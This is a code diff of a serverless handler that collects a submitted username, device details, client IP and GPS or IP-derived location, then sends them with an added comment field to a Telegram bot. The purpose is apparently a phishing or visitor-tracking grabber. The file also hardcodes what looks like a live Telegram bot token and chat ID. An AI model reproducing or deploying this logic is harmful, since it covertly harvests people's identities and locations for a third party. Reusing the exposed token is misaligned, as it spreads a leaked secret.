@@ -3,13 +3,12 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' });
   }
 
-  const { username, userAgent, location } = req.body;
+  const { username, userAgent, location, comment } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || 'unknown';
 
   // Clean up User-Agent to get a readable device string
   let deviceInfo = 'Unknown';
   if (userAgent) {
-    // Extract Android model and OS version
     const androidMatch = userAgent.match(/Android\s([\d.]+)/);
     const modelMatch = userAgent.match(/;\s([^;]+?)\s+Build/);
     if (androidMatch && modelMatch) {
@@ -23,7 +22,6 @@ export default async function handler(req, res) {
     } else if (userAgent.includes('Macintosh')) {
       deviceInfo = 'Mac';
     } else {
-      // fallback: first 50 chars
       deviceInfo = userAgent.substring(0, 50);
     }
   }
@@ -33,7 +31,6 @@ export default async function handler(req, res) {
   if (location && location.lat && location.lon) {
     mapLink = `https://www.google.com/maps?q=${location.lat},${location.lon}`;
   } else {
-    // Fallback to IP geolocation
     let lat = null, lon = null;
     try {
       const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
@@ -53,9 +50,15 @@ export default async function handler(req, res) {
   }
 
   const timestamp = new Date().toLocaleString();
-  const message = `🔐 *New Login*\n👤 User: ${username}\n📱 DEVICE : ${deviceInfo}\n🌍 DEVICE IP: ${ip}\n🗺️ [MAP LOCATION](${mapLink})\n⏰ Time: ${timestamp}`;
 
-  // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
+  // Build the message – include comment if provided
+  let message = `🔐 *New Login*\n👤 User: ${username}\n📱 DEVICE : ${deviceInfo}\n🌍 DEVICE IP: ${ip}\n🗺️ [MAP LOCATION](${mapLink})\n⏰ Time: ${timestamp}`;
+
+  if (comment && comment.trim() !== '') {
+    message += `\n💬 COMMENT: ${comment.trim()}`;
+  }
+
+  // Telegram bot credentials
   const BOT_TOKEN = '7956448684:AAHA1Ka5G9NMAK-pHVnDADKg2AKS5gQhI5g';
   const CHAT_ID = '6941463365';
 
